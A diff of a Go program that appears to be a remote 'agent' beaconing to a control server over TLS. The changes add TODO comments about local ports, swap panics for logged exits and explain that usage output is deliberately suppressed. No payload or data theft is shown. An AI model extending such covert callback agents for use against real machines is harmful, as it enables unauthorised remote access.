@@ -47,6 +47,8 @@ var (
 )
 
 func callback() {
+	// TODO: Allow for custom local port to be specified, currently unsure how to do this.
+	//       Can do it with net.Dial(), but there's no option in tls.Dial()...
 	conn, err := tls.Dial("tcp", serverIP+":"+fmt.Sprint(serverPort), &tlsConfig)
 	//conn, err := net.DialTCP("tcp", &localAddress, &serverAddress)
 	if err != nil {
@@ -70,6 +72,8 @@ func testServer() {
 	utils.Log(utils.Info, "Local Address: ", localAddress.IP.String()+":"+fmt.Sprint(localAddress.Port))
 	utils.Log(utils.Info, "Server Address:", serverAddress.IP.String()+":"+fmt.Sprint(serverAddress.Port))
 
+	// TODO: Allow for custom local port to be specified, currently unsure how to do this.
+	//       Can do it with net.Dial(), but there's no option in tls.Dial()...
 	conn, err := tls.Dial("tcp", serverIP+":"+fmt.Sprint(serverPort), &tlsConfig)
 	if err != nil {
 		utils.LogError(utils.Error, err, "Could not connect to server")
@@ -79,8 +83,11 @@ func testServer() {
 	testMessage := "Agent " + agentUUID.String() + " testing connection"
 	numBytes, err := conn.Write([]byte(testMessage))
 	if err != nil {
-		utils.Log(utils.Error, "Could not send data to server")
-		panic(err)
+		utils.LogError(utils.Error, err, "Could not send data to server")
+		os.Exit(ERR_WRITE)
+	} else if numBytes == 0 {
+		utils.LogError(utils.Error, err, "Sent 0 bytes")
+		os.Exit(ERR_BYTES)
 	}
 
 	utils.Log(utils.Done, "Wrote", fmt.Sprint(numBytes), "bytes to server")
@@ -119,6 +126,7 @@ func (info agentInfoStruct) printAgentInfo() {
 func main() {
 
 	// Optionally print this Agent's information
+	// Intentionally not using the "flag" package because we never want to print usage information
 	if len(os.Args) > 1 { // contains a command-line flag
 		if os.Args[1] == "--info" {
 			agentInfo.printAgentInfo()
